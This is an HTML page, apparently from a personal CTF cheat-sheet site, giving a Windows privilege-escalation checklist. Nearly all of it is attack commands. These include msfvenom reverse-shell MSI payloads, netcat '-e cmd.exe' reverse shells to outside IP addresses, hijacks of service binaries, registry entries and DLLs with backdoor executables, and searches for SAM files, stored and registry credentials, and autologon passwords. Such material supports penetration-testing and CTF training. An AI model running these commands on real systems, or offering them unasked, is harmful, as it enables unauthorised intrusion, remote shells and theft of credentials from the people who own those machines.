+        <doc-anchor-trigger class="header-anchor-trigger" to="#check-if-service-config-can-be-modified">#</doc-anchor-trigger>
+        <span>Check if service config can be modified</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">accesschk.exe /accepteula
+accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula
+accesschk.exe -ucqv \\&lt;Service Name&gt;
+sc qc \\&lt;Service Name&gt;  #  Get service details</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="unquoted-service-path">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#unquoted-service-path">#</doc-anchor-trigger>
+        <span>Unquoted Service Path</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\\windows\\\\&quot; |findstr /i /v &quot;&quot;&quot;
+sc query
+sc qc service name</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="alwaysinstallelevated">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#alwaysinstallelevated">#</doc-anchor-trigger>
+        <span>AlwaysInstallElevated</span>
+    </h2>
+</doc-anchor-target>
+<p>IF 64 bits use: %SystemRoot%\Sysnative\reg.exe</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\
+# Check for AlwaysInstallElevated = 1 , if yes create a msfvenom msi payload
+msfvenom -p windows/shell_reverse_tcp lhost= lport= -f msi -o setup.msi
+msiexec /quiet /qn /i C:\\Temp\\setup.msi</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="service-only-available-from-inside">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#service-only-available-from-inside">#</doc-anchor-trigger>
+        <span>Service only available from inside</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">netstat -ano
+upload plink.exe
+plink.exe -R &quot;remote port&quot;:127.0.0.1:&quot;local port&quot;  root@&quot;ipaddress&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="password-in-files">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#password-in-files">#</doc-anchor-trigger>
+        <span>Password in files</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># Check for savecred
+# &lt;https://pentestlab.blog/tag/privilege-escalation/page/3/&gt;
+cmdkey /list        &lt;&lt; If there are entries, it means that we may able to runas certain user who stored his cred in windows
+runas /savecred /user:ACCESS\\Administrator &quot;c:\\windows\\system32\\cmd.exe /c \\\\IP\\share\\nc.exe -nv 10.10.14.2 80 -e cmd.exe&quot;
+Can we find any SAM files?
+%SYSTEMROOT%\\repair\\SAM
+%SYSTEMROOT%\\System32\\config\\RegBack\\SAM
+%SYSTEMROOT%\\System32\\config\\SAM
+%SYSTEMROOT%\\repair\\system
+%SYSTEMROOT%\\System32\\config\\SYSTEM
+%SYSTEMROOT%\\System32\\config\\RegBack\\system
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+Findstr /si password *.config
+findstr /si pass/pwd *.ini
+dir /s *pass* == *cred* == *vnc* == *.config*
+in all files
+findstr /spin &quot;password&quot; *.*
+findstr /spin &quot;password&quot; *.*</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="unattended-config">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#unattended-config">#</doc-anchor-trigger>
+        <span>Unattended config</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">c:\\sysprep.inf
+c:\\sysprep\\sysprep.xml
+c:\\unattend.xml
+%WINDIR%\\Panther\\Unattend\\Unattended.xml
+%WINDIR%\\Panther\\Unattended.xml
+dir /b /s unattend.xml
+dir /b /s web.config
+dir /b /s sysprep.inf
+dir /b /s sysprep.xml
+dir /b /s *pass*
+dir c:\\*vnc.ini /s /b
+dir c:\\*ultravnc.ini /s /b
+dir c:\\ /s /b | findstr /si *vnc.ini</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="registry">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#registry">#</doc-anchor-trigger>
+        <span>Registry</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="vnc">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#vnc">#</doc-anchor-trigger>
+        <span>VNC</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot;
+reg query &quot;HKCU\\Software\\TightVNC\\Server&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="windows-autologin">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#windows-autologin">#</doc-anchor-trigger>
+        <span>Windows autologin</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;
+reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="snmp-paramters">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#snmp-paramters">#</doc-anchor-trigger>
+        <span>SNMP Paramters</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="putty">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#putty">#</doc-anchor-trigger>
+        <span>Putty</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query &quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="search-for-password-in-registry">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#search-for-password-in-registry">#</doc-anchor-trigger>
+        <span>Search for password in registry</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f pass /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query HKCU /f pass /t REG_SZ /s</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="regsvc-acl">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#regsvc-acl">#</doc-anchor-trigger>
+        <span>REGSVC ACL</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># Check for registry services
+&gt; Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl
+
+# Look for access group permissions for NT AUTH/Interactive
+Create a new window service binary, check attack directory for source (net user add works)
+&gt; x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+
+# Add to the registry path
+&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f
+
+# Execute using
+&gt; sc start regsvc</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="unquoted-service-path-exploitation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#unquoted-service-path-exploitation">#</doc-anchor-trigger>
+        <span>Unquoted Service Path Exploitation</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="case-1-seshutdownprivilege-is-listed-when-checked-whoami-priv">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#case-1-seshutdownprivilege-is-listed-when-checked-whoami-priv">#</doc-anchor-trigger>
+        <span>Case 1, <code v-pre>SeShutdownPrivilege</code> is listed when checked whoami /priv</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># Search for services that auto start:
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot;
+# Search for non-standard services
+wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\\windows&quot;
+# Potential unquoted service output example
+Heisenburg Service   heisenburgsvc     &quot;C:\\Program Files\\Heisenburg\\The One Who\\knocks.exe&quot;        auto
+
+# next check if W or F permission exists for BUILTIN\\Users or Everyone on one of the sub directory
+icacls &quot;C:\\\\&quot;                        # or: .\\accesschk.exe /accepteula -uwdq C:\\
+icacls &quot;C:\\Program Files&quot;             # or: .\\accesschk.exe /accepteula -uwdq &quot;C:\\Program Files&quot;
+icacls &quot;C:\\Program Files\\Heisenburg&quot;  # or  .\\accesschk.exe /accepteula -uwdq &quot;C:\\Program Files\\Heisenburg&quot;
+
+# Example output if (builtin\\users or EVERYONE) has ( (I) or (F) ) on &quot;C:\\Program Files\\Heisenburg&quot;:
+#                  BUILTIN\\Users:(F)
+#                  BUILTIN\\Users:(I)(RX)
+# Example output for accesschk.exe:
+#  RW BUILTIN\\Users
+
+# Create reverse shell binary and copy it accordingly
+copy %temp%\\backdoor.exe &quot;C:\\Program Files\\Heisenburg\\The.exe&quot;
+
+# now reboot to have the service auto start
+shutdown /r /t 0</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="case-2-seshutdownprivilege--disabled-we-have-service_stopservice_start-privilege-on-a-service">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#case-2-seshutdownprivilege--disabled-we-have-service_stopservice_start-privilege-on-a-service">#</doc-anchor-trigger>
+        <span>Case 2, <code v-pre>SeShutdownPrivilege</code> = Disabled, we have (service_stop,service_start) privilege on a service</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># Search for services that has manual start mode and non-standard
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;manual&quot; | findstr /i /v &quot;c:\\windows&quot;
+# Potential unquoted service output example
+Heisenburg Service   heisenburgsvc     &quot;C:\\Program Files\\Heisenburg\\The One Who\\knocks.exe&quot;        manual
+
+# Check if we have service_stop, service_start privilege
+.\\accesschk.exe /accepteula -ucqv user heisenburgsvc
+
+# next check if W or F permission exists for BUILTIN\\Users or Everyone on one of the sub directory
+icacls &quot;C:\\\\&quot;                         # or: .\\accesschk.exe /accepteula -uwdq C:\\
+icacls &quot;C:\\Program Files&quot;             # or: .\\accesschk.exe /accepteula -uwdq &quot;C:\\Program Files&quot;
+icacls &quot;C:\\Program Files\\Heisenburg&quot;  # or  .\\accesschk.exe /accepteula -uwdq &quot;C:\\Program Files\\Heisenburg&quot;
+# Example output if (builtin\\users or EVERYONE) has ( (I) or (F) ) on &quot;C:\\Program Files\\Heisenburg&quot;:
+#                  BUILTIN\\Users:(F)
+#                  BUILTIN\\Users:(I)(RX)
+
+# Example output for accesschk.exe:
+  RW BUILTIN\\Users
+
+Since there is spaces between &quot;\\The One Who\\&quot; on the path
+Windows will look for &quot;\\The.exe&quot; first, then &quot;\\The One.exe&quot;, then &quot;\\The One Who.exe&quot;, and finally &quot;\\The One Who\\knocks.exe&quot;
+
+# Create reverse shell binary and copy it accordingly
+copy %temp%\\backdoor.exe &quot;C:\\Program Files\\Heisenburg\\The.exe&quot;
+
+# Start netcat listener to catch the reverse shell and start the service
+net start heisenburgsvc # net stop heisenburgsvc first if the service is already running.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="weak-service-permissions-exploitation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#weak-service-permissions-exploitation">#</doc-anchor-trigger>
+        <span>Weak service permissions Exploitation</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># download accesschk.exe form here &lt;https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe&gt;
+# List access for all services
+.\\accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; * # or: .\\accesschk.exe /accepteula -uwcqv user *
+
+# Example Output, have full access in two services:
+$ RW SSDPSRV
+$	SERVICE_ALL_ACCESS
+$ RW upnphost
+$	SERVICE_ALL_ACCESS
+# at least (service_change_config, service_start, service_stop) access is needed, service_all_access = full access
+# If both conditions are met we can start exploiting this now.
+
+# List current config for the service
+sc qc upnphost
+
+# see if START TYPE is DEMAND_START and if SERVICE_START_NAME is higher privileged
+ $        START_TYPE         : 3   DEMAND_START
+ ...
+ ...
+ $        SERVICE_START_NAME : NT AUTHORITY\\LocalService
+
+# change binpath with the payload you want to execute, example rev shell with uploaded nc.exe:
+sc config &quot;upnphost&quot; binpath= &quot;C:\\WINDOWS\\Temp\\nc.exe 192.168.119.147 443 -e C:\\WINDOWS\\System32\\cmd.exe&quot;
+
+# remove dependencies (if any)
+sc config &quot;upnphost&quot; depend= &quot;&quot;
+
+# make it run from system account
+sc config &quot;upnphost&quot; obj= &quot;.\\LocalSystem&quot; password= &quot;&quot;
+
+# Start netcat listener to catch the reverse shell and start the service
+net start &quot;upnphost&quot; # net stop &quot;upnphost&quot; first if the service is already running.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="weak-registry-permissions-exploitation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#weak-registry-permissions-exploitation">#</doc-anchor-trigger>
+        <span>Weak Registry Permissions Exploitation</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># Check permissions for an example service &quot;upnphost&quot;
+Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\upnphost | Format-List # PowerShell
+
+# Example output, Check if NT AUTHORITY\\INTERACTIVE has Full Control
+Access : Everyone Allow  ReadKey
+        NT AUTHORITY\\INTERACTIVE Allow  FullControl
+        NT AUTHORITY\\SYSTEM Allow  FullControl
+
+.\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\upnphost # same thing accesschk
+# Example output for accesschk.exe:
+ RW NT AUTHORITY\\INTERACTIVE
+       KEY_ALL_ACCESS
+
+# Check if we have service_stop, service_start privilege
+.\\accesschk.exe /accepteula -ucqv user upnphost
+# If both conditions are met we can start exploiting this now.
+# list current values of the service
+reg query HKLM\\System\\CurrentControlSet\\Services\\upnphost
+
+# example output:
+HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\upnphost
+   DisplayName    REG_SZ    @%systemroot%\\system32\\upnphost.dll,-213
+   ErrorControl    REG_DWORD    0x1
+   ImagePath    REG_EXPAND_SZ    %SystemRoot%\\system32\\svchost.exe -k LocalServiceAndNoImpersonation
+   ...
+
+# update ImagePath to point to our reverse shell payload
+reg add HKLM\\System\\CurrentControlSet\\Services\\upnphost /v ImagePath /t REG_EXPAND_SZ /d C:\\Windows\\Temp\\backdoor.exe /f
+
+# Start netcat listener to catch the reverse shell and start the service
+net start &quot;upnphost&quot; # net stop &quot;upnphost&quot; first if the service is already running.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="weak-service-executable-file-permissions-exploitation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#weak-service-executable-file-permissions-exploitation">#</doc-anchor-trigger>
+        <span>Weak Service Executable File Permissions Exploitation</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># verifying we can overwrite and existing service binary file
+icacls &quot;C:\\Program Files\\Heisenburg\\knocks.exe&quot;  # or .\\accesschk.exe /accepteula -uvwq &quot;C:\\Program Files\\Heisenburg\\knocks.exe&quot;
+# Example output if (builtin\\users or EVERYONE) has ( (I) or (F) ) on &quot;C:\\Program Files\\Heisenburg&quot;:
+                  Everyone:(F)
+                  BUILTIN\\Users:(I)(RX)
+
+# Example output for accesschk.exe:
+  RW BUILTIN\\Users
+        FILE_ALL_ACCESS
+
+# backup original executable
+copy &quot;C:\\Program Files\\Heisenburg\\knocks.exe&quot;  C:\\Temp\\
+
+# Create reverse shell binary and overwrite the existing one
+copy /Y C:\\Temp\\backdoor.exe &quot;C:\\Program Files\\Heisenburg\\knocks.exe&quot;
+
+# Start netcat listener to catch the reverse shell and start the service
+net start &quot;heisenburgsvc&quot; # net stop &quot;heisenburgsvc&quot; first if the service is already running.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="alwaysinstallelevated-privilege-escalation">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#alwaysinstallelevated-privilege-escalation">#</doc-anchor-trigger>
+        <span>AlwaysInstallElevated privilege Escalation</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; value 0x1.
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+# if the conditions are met we can exploit this now
+
+# generate reverse shell msi payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;MY-IP&gt; LPORT=&lt;MY-PORT&gt; -f msi -o shell.msi
+
+# copy the binary over to target, start a listener and exec
+msiexec /quiet /qn /i C:\\Temp\\shell.msi</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="dll-hijacking">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dll-hijacking">#</doc-anchor-trigger>
+        <span>DLL hijacking</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">You can see the DLL search order on 32-bit systems below:
+1 - The directory from which the application loaded
+2 - 32-bit System directory (C:\\Windows\\System32)
+3 - 16-bit System directory (C:\\Windows\\System)
+4 - Windows directory (C:\\Windows)
+5 - The current working directory (CWD)
+6 - Directories in the PATH environment variable (system then user)
+
+As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.
+echo %path%
+
+# We can check our access permissions with accesschk or cacls
+accesschk.exe -dqv &quot;C:\\Python27&quot;
+cacls &quot;C:\\Python27&quot;
+
+# Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to &quot;AUTO_START&quot; so it will launch on boot!
+sc qc IKEEXT
+copy evil.dll C:\\Python27\\wlbsctrl.dll
+Restart</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="stored-credentials">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#stored-credentials">#</doc-anchor-trigger>
+        <span>Stored credentials</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">cmdkey /list
+
+# if saved creds exist use runas to execute as that user
+runas /savedcred /user:&lt;USERNAME-OF-SAVED-CRED&gt; C:\\Temp\\backdoor.exe
+
+Get passwords from windows registry
+# autologon creds
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon' | select &quot;Default*&quot;
+or,
+reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;
+
+# VNC
+reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot;
+
+# SNMP Paramters
+reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot;
+
+# Putty
+reg query &quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot;
+
+Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="files-that-may-contain-passwords">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#files-that-may-contain-passwords">#</doc-anchor-trigger>
+        <span>Files that may contain passwords</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">c:\\sysprep.inf
+c:\\sysprep\\sysprep.xml
+%WINDIR%\\Panther\\Unattend\\Unattended.xml
+%WINDIR%\\Panther\\Unattended.xml
+# sysbol policy files containing cPassword on a domain controller;
+# general locations: %SYSTEMROOT%\\SYSVOL\\sysvol
+# \\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\
+Services\\Services.xml: Element-Specific Attributes
+ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
+Printers\\Printers.xml: SharedPrinter Element
+Drives\\Drives.xml: Element-Specific Attributes
+DataSources\\DataSources.xml: Element-Specific Attributes</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="find-all-weak-folder-permissions-per-drive">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#find-all-weak-folder-permissions-per-drive">#</doc-anchor-trigger>
+        <span>Find all weak folder permissions per drive</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">accesschk.exe -uwdqs Users c:\\
+accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="find-all-weak-file-permissions-per-drive">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#find-all-weak-file-permissions-per-drive">#</doc-anchor-trigger>
+        <span>Find all weak file permissions per drive</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">accesschk.exe -uwqs Users c:\\*.*
+accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\\*.*</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctf-cheat-sheets/linuxprivesc/weakfiles0ec7a/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Weak Files Permissions</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctf-cheat-sheets/windowsprivesc/potatoes-ea4db/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Potatoes</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2023. Caue All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Big Checklist", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+</body>
+</html>
